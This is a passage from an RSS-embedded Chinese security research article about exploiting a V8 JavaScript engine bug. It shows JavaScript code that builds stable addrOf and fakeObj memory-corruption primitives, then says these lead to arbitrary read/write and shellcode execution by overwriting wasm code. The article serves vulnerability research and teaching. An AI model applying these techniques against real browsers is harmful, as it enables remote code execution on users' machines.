        &lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ppp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;faker&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;ppp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;然而, 这种方式非常的不稳定。如果我们用它太多次，V8就会触发垃圾回收导致我们伪造的对象全部被破坏，造成程序崩溃。&lt;/p&gt;&lt;p&gt;因此，我们通过用此原语来伪造一个数组，来构造更稳定的fake和leak原语。&lt;/p&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-js&quot;&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;o&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;a&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mf&quot;&gt;0.0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;b&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;c&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{},&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;d&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;addrOf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;o&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x0000100400000000&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;f&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;nx&quot;&gt;faked&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;addrOf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;o&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mh&quot;&gt;0x20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fake_arr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fake_obj&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;faked&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;asDouble&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;());&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;// we create a stable primitive
&lt;/span&gt;&lt;span class=&quot;c1&quot;&gt;&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;addrof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;o&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;addr_o&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;asDouble&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;o&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;fake_arr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;obj&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;o&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;double&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fake_arr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fakeobj&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;o&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;d&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;addr_o&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;asDouble&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;o&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;double&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;fake_arr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;o&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;b&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;kd&quot;&gt;var&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;nx&quot;&gt;fake_arr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;7&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2&gt;代码执行&lt;/h2&gt;&lt;p&gt;拥有了稳定的addrOf和fakeObj原语后，完成漏洞利用已如探囊取物。&lt;/p&gt;&lt;p&gt;我们直接跟着已有的方法来获取任意地址读写原语，之后通过覆盖掉wasm的代码完成了任意shellcode执行。&lt;/p&gt;&lt;h2&gt;Demo&lt;/h2&gt;&lt;p&gt;最终演示效果如下&lt;/p&gt;&lt;a class=&quot;video-box&quot; href=&quot;https://link.zhihu.com/?target=https%3A//www.zhihu.com/video/1132580930270945280&quot; target=&quot;_blank&quot; data-video-id=&quot;&quot; data-video-playable=&quot;true&quot; data-name=&quot;最终效果&quot; data-poster=&quot;https://pic2.zhimg.com/v2-45543ee2ae5e4618abefeb774c2c10a9.jpg&quot; data-lens-id=&quot;1132580930270945280&quot;&gt;&lt;img class=&quot;thumbnail&quot; src=&quot;https://pic2.zhimg.com/v2-45543ee2ae5e4618abefeb774c2c10a9.jpg&quot;/&gt;&lt;span class=&quot;content&quot;&gt;&lt;span class=&quot;title&quot;&gt;最终效果&lt;span class=&quot;z-ico-extern-gray&quot;&gt;&lt;/span&gt;&lt;span class=&quot;z-ico-extern-blue&quot;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;url&quot;&gt;&lt;span class=&quot;z-ico-video&quot;&gt;&lt;/span&gt;https://www.zhihu.com/video/1132580930270945280&lt;/span&gt;&lt;/span&gt;&lt;/a&gt;&lt;h2&gt;致谢&lt;/h2&gt;&lt;p&gt;感谢部分Tea Deliverers战队成员在本文章编写中提供的宝贵意见。感谢杨坤博士对本文进行的校对。&lt;/p&gt;&lt;h2&gt;参考资料&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//abiondo.me/2019/01/02/exploiting-math-expm1-v8/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;Exploiting the Math.expm1 typing bug in V8&lt;/a&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//hackmd.io/BhJFLclYRw2f58XYu7h_GQ%3Fview%23fnref1&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;↩︎&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/%23preparing-turbolizer&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;Introduction to TurboFan&lt;/a&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//abiondo.me/2019/01/02/exploiting-math-expm1-v8/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;↩&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;a href=&quot;https://link.zhihu.com/?target=https%3A//doar-e.github.io/blog/2019/05/09/circumventing-chromes-hardening-of-typer-bugs/&quot; class=&quot; wrap external&quot; target=&quot;_blank&quot; rel=&quot;nofollow noreferrer&quot;&gt;Circumventing Chrome&amp;#39;s hardening of typer bugs&lt;/a&gt;&lt;/p&gt;</description>
<author>赵汉青</author>
<guid isPermaLink="false">2019-07-16-73081003</guid>
<pubDate>Tue, 16 Jul 2019 00:00:00 +0800</pubDate>
</item>
</channel>
</rss>
